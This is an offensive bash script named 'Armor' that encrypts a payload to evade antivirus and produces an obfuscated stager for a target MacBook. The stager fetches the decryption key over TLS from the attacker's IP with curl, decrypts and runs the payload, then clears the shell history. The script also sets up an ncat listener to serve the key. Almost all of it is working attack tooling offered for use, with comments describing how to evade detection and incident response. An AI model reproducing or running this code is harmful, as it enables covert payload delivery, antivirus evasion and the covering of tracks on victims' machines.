#!/bin/bash
# based on the work by @tokyoneon_
# Armor relies on LibreSSL to encrypt the input file and create the SSL certificate.
# If LibreSSL isn't found in your system, Armor will attempt to install it. 

# Variables for colorful terminal output.
R="\033[1;31m"
Y="\033[1;33m"
G="\033[1;32m"
N="\033[0;39m"

clear
# The script name, taken from the input file; first arg.
sN="$(echo "$1" | sed 's/.*\///')"

# Random 4-digit string appended to the filename to prevent clobbering 
# previous iterations of the same input file and to avoid enumation attempts
# by anyone crawling the attackers server to locate the master key. To increase
# the length of the random string, change "2" to "5" or "10".
fnRand="$(openssl rand -hex 2)"

# The script name and random string are combined to create the filename
# for most of the generated files.
inFile="$sN"_"$fnRand"

# When generating self-signed SSL certificates, a Common Name (domain name)
# is required. This value could've been static, but I decided to have
# each certificate contain a unique Common Name. Actually, when the master
# key is fetched from the attacker's server, the Common Name is ignored.
# This is just a formality.
cnRand="$(openssl rand -hex 4)"

# A random string is inserted into the encoded stager to make the base64
# string appear different every time. This is done to obfuscate the string
# and (hopefully) make it less identifiable to antivirus software. 
junk="$(openssl rand -hex 12)"

# The attacker's IP address is converted into a hexidecimal string. There's
# no real reason for this, it's easily reverse engineered back an IPv4 
# address. Still, in the spirit of overkill obfuscation, this felt appropriate.
aH="0x$(printf '%02X' $(echo ${2//./ }))"

# The attacker's desired port number. This port number is used by the 
# target device to fetch the master key and decrypt the payload. Be careful
# not to use your Metasploit or Netcat listening port here. 
aP="$3"

# A variable created to identify the working directory. This variable is 
# used in several functions.
dir="$(pwd -P)"

# The below three functions are used to print messages in the script. They 
# use the previously defined color variables to print messages, instructions,
# and errors.
function msg () {
	echo -e "$G [+] $N $1" 
}

function msg_instruct () {
	echo -e "$Y \n [!] $1\n $N"
}

function msg_fatal () {
	echo -e "$R \n [ERROR] $1\n $N" 
	exit 0
}

# OS detection for below ascii_art function. Base64 "-D" for macOS, "-d" for 
# Debian/Ubuntu. Other operating systems are untested.
function os_detect () {
	case "$(uname -s)" in
	   Darwin)
		 osDetect='-D'
		 ;;
	   Linux)
		 osDetect='-d'
		 ;;
	   *)
		 msg_fatal "OS detection failed. Comment out the os_detect and ascii_art functions to force continue."
		 ;;
	esac
	}

os_detect

# The "armor" and panther ascii art are encoded; easier than escaping 
# special characters. Comment out the ascii_art function to suppress the 
# logo. It's gimmicky, I know.
function ascii_art () {
	echo -e "$R" "$(echo 'CgoKCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLi4sY284b2Mub284ODg4Y2MsLi4KCSAg
ICBvOG8uICAgICAgICAgICAgICAgIC4uLG84ODk2ODlvb284ODhvIjg4ODg4ODg4b29vYy4uCgkg
IC44ODg4ICAgICAgICAgICAgICAgLm84ODg4Njg4OCIuODg4ODg4ODhvJz84ODg4ODg4ODg4ODlv
b28uLi4uCgkgIGE4OFAgICAgICAgICAgICAuLmM2ODg4NjkiIi4uLCJvODg4ODg4ODg4by4/ODg4
ODg4ODg4OCIiLm9vbzg4ODhvby4KCSAgMDg4UCAgICAgICAgIC4uYXRjODg4OSIiLixvbzhvLjg2
ODg4ODg4ODg4byA4ODk4ODg4OSIsbzg4ODg4ODg4ODg4OC4KCSAgODg4dCAgLi4uY29vNjg4ODg5
Iicub29vODhvODhiLic4Njk4ODk4ODg4OSA4Njg4ODg4J284ODg4ODk2OTg5Xjg4OG8KCSAgIDg4
ODg4ODg4ODg4OCIuLm9vbzg4ODk2ODg4ODg4ICAgIjlvNjg4ODg4JyAiODg4OTg4IDg4ODg4Njg4
ODgnbzg4ODg4CiAgICAgICAgICAgIiJHODg4OSIiJ29vbzg4ODg4ODg4ODg4ODg5ICAgLmQ4bzk4
ODkiIicgICAiODY4OG8uIjg4ODg4OTg4Im84ODg4ODhvIC4KCQkgICAgbzg4ODgnIiIiIiIiIiIi
JyAgICAgbzg2ODgiICAgICAgICAgIDg4ODY4LiA4ODg4ODguNjg5ODg4ODgibzhvLiAKCQkgICAg
ODg4ODhvLiAgICAgICAgICAgICAgIjg4ODhvb28uICAgICAgICAnODg4OC4gODg4ODguODg5ODg4
OG8iODg4by4uCgkgICAgICAgICAgICI4ODg4bCAnICAgICAgICAgICAgICAgIjg4ODg4OCcgICAg
ICAgICAgJyIiOG8iODg4OC44ODY5ODg4b284ODg4byAKICAgICAuOy4gICAgICAuOzs7OzssLiAg
ICAgLCcgICAgICAgLCwgICAgIC4sOywnICAgICAgOzs7OzssLiAgOi4iODg4OCAiODg4ODg4ODg4
Xjg4bwogICAgIE9NMCAgICAgIHhXbDo6Y29LMC4gIC5XTSwgICAgIDtNVyAgICxLT2xjY3hYZCAg
ICdNazo6Y2xrWGMgLi44ODg4LC4gIjg4ODg4ODg4ODg4LgogICAgLldYTS4gICAgIHhXICAgICAg
SzAgIC5XTUsgICAgIEtNVyAgIE5rICAgICA7TTogICdNOiAgICAgbE0nOm84ODgubzhvLiAgIjg2
Nm85ODg4bwogICAgbE4uWG8gICAgIHhXICAgICAgT0sgIC5XS1djICAgbFdLVyAgLldkICAgICAu
TWwgICdNOiAgICAgO00sOjg4OC5vODg4OC4gICI4OC4iODkiLgogICAgMGsgZFggICAgIHhXICAg
ICAgT0sgIC5Xb2RYLiAuTm9kVyAgLldkICAgICAuTWwgICdNOiAgICAgO00sIDg5ICA4ODg4ODgg
ICAgIjg4IjouCiAgICdNOyAnTSwgICAgeFcgICAgICBLTyAgLldvLk5vIGRYIGRXICAuV2QgICAg
IC5NbCAgJ006ICAgICBvTS4gICAgICc4ODg4bwogICBvTiAgIEt4ICAgIHhXLmNjY29LTy4gIC5X
byBjV2xXOiBkVyAgLldkICAgICAuTWwgICdNYztjY2xrWGMgICAgICAgIjg4ODguLgogICBYZCAg
IG9OLiAgIHhXIHhXYycuICAgIC5XbyAgS00wICBkVyAgLldkICAgICAuTWwgICdNOixXTycuICAg
ICAgICAgIDg4ODg4OG8uCiAgO01jLi4uOk1jICAgeFcgIDBLLiAgICAgLldvICAsVycgIGRXICAu
V2QgICAgIC5NbCAgJ006IGNXOiAgICAgICAgICAgICI4ODg4ODksCiAgT1hsbGxsbEtLICAgeFcg
IC5LTyAgICAgLldvICAgJyAgIGRXICAuV2QgICAgIC5NbCAgJ006ICBvTicgICAgICAgLiA6IDou
Ojo6Oi46IDouCiAuTW8gICAgIGNNLCAgeFcgICAuWGQgICAgLldvICAgICAgIGRXICAuV2QgICAg
IC5NbCAgJ006ICAgZFguICAgY3JlYXRlZCBieSBAdG9reW9uZW9uXwogb1cuICAgICAuV2QgIHhX
ICAgICdXOiAgIC5XbyAgICAgICBkVyAgIFhPICAgICA6TTsgICdNOiAgICAwTyAgIAogS08gICAg
ICAgeE4gIHhXICAgICA6TiwgIC5XbyAgICAgICBkVyAgIC5PMHhvZE8wYyAgICdNOiAgICAuWGsg
IAogCgoKCgoKCgoKCgoKCg==' | base64 "$osDetect")"$N""
	}

ascii_art

# The version of OpenSSL found in Debian/Kali isn't compatible with macOS' LibreSSL. 
# Payloads encrypted in Kali will not be decryptable by the target MacBook.
# As a workaround, OpenSSL in Ubuntu was tested and is compatible with LibreSSL 
# in macOS. Alternatively, allow the armor script to attempt to install LibreSSL. 
# https://linuxg.net/how-to-install-libressl-2-1-6-on-linux-systems/
# https://github.com/libressl-portable/portable
function libressl_install () {
	if [[ ! -f /usr/bin/make ]]; then
		msg_fatal "make: command not found. Install with: sudo apt-get install build-essential"
	fi
	wget 'https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-2.8.2.tar.gz' &&\
	tar -xzvf libressl-2.8.2.tar.gz libressl-2.8.2/ &&\
	cd libressl-2.8.2/ &&\
	./configure &&\
	make &&\
	sudo make install &&\
	sudo ldconfig &&\
	if [[ "$(/usr/local/bin/openssl version -v | awk '{print $1}')" = 'LibreSSL' ]]; then
		msg "It appears LibreSSL was installed successfully."
	else
		msg_fatal "Unknown issue while installing LibreSSL."
	fi
	}

# Verifies LibreSSL compatibility or tries to install it.
function openssl_check () {
	if [[ $(/usr/bin/openssl version -v | awk '{print $1}') = 'LibreSSL' ]]; then
		opensslPath='/usr/bin/openssl'
	elif [[ $(/usr/local/bin/openssl version -v | awk '{print $1}') = 'LibreSSL' ]]; then
		opensslPath='/usr/local/bin/openssl'
	else
		msg_instruct "LibreSSL version detection failed. MacOS uses LibreSSL and will not be able to decrypt payloads made in Debian/Kali (e.g., OpenSSL 1.1.0h). Attempt to install LibreSSL? y/N"
		read libreInstall
		if [[ "$libreInstall" = 'y' ]]; then
			libressl_install
			exit 0
		else
			exit 0
		fi
	fi
	}

# The master key used to encrypt the payload is generated.
function mk_key () {
	"$opensslPath" rand -hex 512 > "$inFile".key &&\
	msg "Generated encryption key: "$dir"/"$inFile".key" ||\
	msg_fatal "Failed to create the master key."
}

# The payload is encrypted and encoded. Encrypted to evade antivirus, encoded
# to make transporting it easier.
function crypt_payload () {
	"$opensslPath" enc -aes-256-cbc -a -A -in "$1" -pass file:"$inFile".key -out "$inFile".enc &&\
	msg "Encrypted payload: "$dir"/"$inFile".enc" ||\
	msg_fatal "Failed to encrypt the payload. Check the file path and filename."
}

# The self-signed SSL certificate for Ncat is generated. Encrypting the 
# transmission of the master key is important. If DPI is taking place at 
# the time of the attack, it would be possible for an incident response
# team to reconstruct the master key using the raw TCP data.
function mk_ssl () {
	"$opensslPath" req -new -newkey rsa:4096 -x509 -sha256 -days 30 -nodes -subj '/CN='"$cnRand"'' \
	-out "$inFile".crt -keyout "$inFile"_ssl.key >/dev/null 2>&1 &&\
	msg "Generated SSL certificate: "$dir"/"$inFile".crt" ||\
	msg_fatal "Unknown error."
	msg "Generated SSL key: "$dir"/"$inFile"_ssl.key"
}

# The suggested stager command is printed. This can be embedded into an 
# AppleScript or used with a USB Rubber Ducky. The `history -c` command is
# appened to the stager to prevent it from being saved to the target's
# Terminal history. This, believe it or not, also helps with evading antivirus
# software. 
function mk_stager () {
	stager=""$junk">/dev/null 2>&1; openssl enc -d -aes-256-cbc \
	-in <(printf '%s' '$(cat "$inFile".enc)' | base64 -D) \
	-pass file:<(curl -s --insecure https://"$aH":"$aP")"
	echo -e "bash -c \"\$(bash -c \"\$(printf '%s' '$(printf '%s' "$stager" | base64)' | base64 -D)\")\";history -c" > "$dir"/"$inFile"_stager.txt &&\
	msg "Saved stager: "$dir"/"$inFile"_stager.txt"
	msg_instruct "Execute the below stager in the target MacBook:"
	cat "$dir"/"$inFile"_stager.txt
}

# The suggested Ncat listener command is printed. Ncat works well because 
# the listener automatically terminates after just one established connection. 
# If the stager is reverse engineered, it would be possible to discover 
# the attacker's IP address and the location of the master key, but at that 
# point, the key will no longer be accessible to the internet (or local network).
function ncat_listener () {
	msg_instruct "Start Ncat listener with:"
	echo -e "$1"
}

# Attempts to start the Ncat listener for you.
function start_ncat () {
	ncatListener="ncat -v --ssl --ssl-cert $dir/$inFile.crt \
--ssl-key $dir/$inFile\_ssl.key \
-l -p $aP < $dir/$inFile.key"
	
	if [[ ! -f /usr/local/bin/ncat ]] && [[ ! -f /usr/bin/ncat ]]; then
		msg_fatal "Ncat not found. Install Nmap: https://nmap.org/book/install.html"
	fi
	msg_instruct "Start the Ncat listener now? y/N "
	read answer
	if [[ "$answer" = 'y' ]]; then
		clear
		msg "Ncat active for stager: "$inFile"..."
		eval "$ncatListener"
	else
		ncat_listener "$ncatListener"
	fi
	}

# Some minor input validation. If the input file, attacker's IP address,
# and port number are not included, the script exits.
if [[ ! $3 ]]; then
	msg_fatal "Missing args. Use the below command:"$N"\n\n$ ./armor.sh /path/to/payload 192.168.1.2 8080"
else	
	# Checks to make sure the input file actually exists.
	if [[ ! -f "$1" ]]; then
		msg_fatal "Payload not found. Check file path and filename."
	fi
fi

# Executes all of the above functions in order.
openssl_check
mk_key
crypt_payload "$1"
mk_ssl
mk_stager
start_ncat
